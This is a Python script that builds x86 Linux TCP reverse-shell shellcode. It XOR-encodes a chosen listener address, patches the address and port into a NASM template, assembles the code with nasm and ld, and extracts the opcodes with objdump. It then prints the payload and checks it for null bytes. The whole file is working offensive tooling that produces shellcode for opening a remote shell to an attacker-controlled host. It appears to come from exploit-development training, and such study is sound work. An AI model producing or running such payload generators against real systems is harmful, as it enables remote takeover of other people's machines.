import argparse
import sys
import os
import socket

def convert_args(address, port):
	
	address = socket.inet_aton(address).hex()
	le_address = bytearray.fromhex(address)
	le_address.reverse()
	address = "0x{0}".format(''.join(format(x, '02x') for x in le_address))

	address = hex(int(address, 16) ^ 0xffffffff)

	port = hex(socket.htons(port))

	return address, port
	
def set_args(address,port):

	address, port = convert_args(address, port)
	asm = open("tcp_reverse_shell_x86.nasm", 'rt')
	data = asm.read()
	data = data.replace('ADDRESS', address)
	data = data.replace('PORT', port)
	asm.close()
	asm = open('tmp.nasm', 'wt')
	asm.write(data)
	asm.close()

def gen_shellcode():
	stream = os.popen("""objdump -d tcp_reverse_shell_x86 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'""")
	shellcode = stream.read().rstrip()
	return shellcode

def print_shellcode(shellcode, address, port):
	print("[*] Generating shellcode for x86 TCP reverse shell on {0}:{1}".format(address, port))
	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print(shellcode)

def main():

	parser = argparse.ArgumentParser(description='Generate x86 TCP reverse shell shellcode.')
	parser.add_argument('-l', '--lhost', type=str, help='Remote IPv4 address for TCP reverse shell to connect to.')
	parser.add_argument('-p', '--port', type=int, help='Remote port for TCP reverse shell to connect to.')
	
	args = parser.parse_args()
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()

	# Modify the host address and port in tcp_reverse_shell_x86.nasm
	set_args(args.lhost, args.port)

	# Link and assemble code
	os.system('nasm -f elf32 -o tcp_reverse_shell_x86.o tmp.nasm')
	os.system('ld -o tcp_reverse_shell_x86 tcp_reverse_shell_x86.o')
	

	# Dump the shellcode using objdump
	shellcode = gen_shellcode()

	# Print shellcode
	print_shellcode(shellcode, args.lhost, args.port)

	# Cleanup
	os.system('rm tmp.nasm')
	os.system('rm tcp_reverse_shell_x86.o')
	os.system('rm tcp_reverse_shell_x86')

if __name__ == "__main__":
	main()
